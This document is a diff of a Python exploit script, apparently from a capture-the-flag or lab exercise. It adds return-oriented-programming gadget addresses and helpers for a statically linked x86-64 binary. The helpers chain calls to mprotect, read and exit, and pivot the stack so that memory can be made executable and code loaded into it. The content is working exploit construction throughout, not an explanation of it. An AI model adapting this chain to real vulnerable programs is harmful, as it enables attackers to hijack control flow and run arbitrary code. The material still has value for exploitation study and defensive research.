@@ -1,11 +1,50 @@
 #!/usr/bin/env python3
 
+from json.tool import main
 from exploiter import exploiter
 
 ea_data = 0x00000000006C1060
 exp = exploiter()
 
 derefer_rax_rax = 0x000000000048fcf0 # mov rax, qword ptr [rax] ; add rsp, 8 ; ret
+push_rcx        = 0x0000000000406F03 
+pop_rax         = 0x000000000044db34
+pop_rsp         = 0x0000000000463C64 # pop rsp ; ret
+pop_rbp         = 0x0000000000419E7F # pop rbp ; ret
+main_addr       = 0x0000000000401383 # push rbp ; mov rbp, rsp
+mprotect_addr   = 0x0000000000435690 
+read_addr       = 0x0000000000434B20
+exit_addr       = 0x0000000000407A50
+nop_gadet       = 0x0000000000408B87
+
+def ret2_exit(exit_code):
+    rdi_equ(exit_code)
+
+    exp.add_gadet(exit_addr)
+
+def ret2_read(fd, buf, count):
+    rdi_equ(fd)
+    rsi_equ(buf)
+    rdx_equ(count)
+
+    exp.add_gadet(read_addr)
+
+def ret2_mprotect(addr, _len, prot):
+    rdi_equ(addr)
+    rsi_equ(_len)
+    rdx_equ(prot)
+    exp.add_gadet(mprotect_addr)
+
+def rbp_equ(val):
+    exp.add_gadet(pop_rbp) # pop rbp ; ret
+    exp.add_gadet(val)
+
+def goto_main():
+    exp.add_gadet(main_addr)
+
+def rsp_equ(val):
+    exp.add_gadet(pop_rsp) # pop rsp ; ret
+    exp.add_gadet(val)
 
 def add_rax_3():
     exp.add_gadet(0x0000000000463ba0)
@@ -204,3 +243,6 @@ class ADD_PTR:
         read_toRAX(pre.TEMP2)
         ex_write_what_where()
 
+class RETURN_TO_MAIN:
+    def __init__(self) -> None:
+        goto_main()
